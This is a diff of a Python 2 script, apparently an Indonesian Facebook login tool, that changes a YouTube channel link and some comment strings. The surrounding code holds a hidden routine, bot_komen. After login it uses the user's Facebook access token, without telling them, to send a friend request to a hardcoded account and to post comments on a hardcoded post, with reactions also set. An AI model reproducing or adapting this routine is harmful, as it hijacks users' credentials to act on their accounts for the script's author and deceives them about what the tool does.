@@ -190,7 +190,7 @@ def tokenz():
 		zedd.write(toket)
 		zedd.close()
 		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
-		os.system('xdg-open https://www.youtube.com/channel/UCYb2TtQ2cMVQOagojCLAx3Q ')
+		os.system('xdg-open https://www.youtube.com/channel/UCOoNmkFfbfrLG2uf1uBUWYg ')
 		bot_komen()
 	except KeyError:
 		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken Salah !"
@@ -205,11 +205,11 @@ def bot_komen():
 		print"\033[1;97m[!] Token invalid"
 		os.system('rm -rf login.txt')
 	una = ('100005789553399')
-	kom = ('GUE PAKE SCRIPT LU NENG MILA 😘😘😘')
+	kom = ('PUNYA ABANG JAGO')
 	reac = ('ANGRY')
 	post = ('1190012567868384')
 	post2 = ('1190012567868384')
-	kom2 = ('KREN SUKSES SELALU YA 😘😘😘')
+	kom2 = ('SELALU BERUSAHA')
 	reac2 = ('LOVE')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
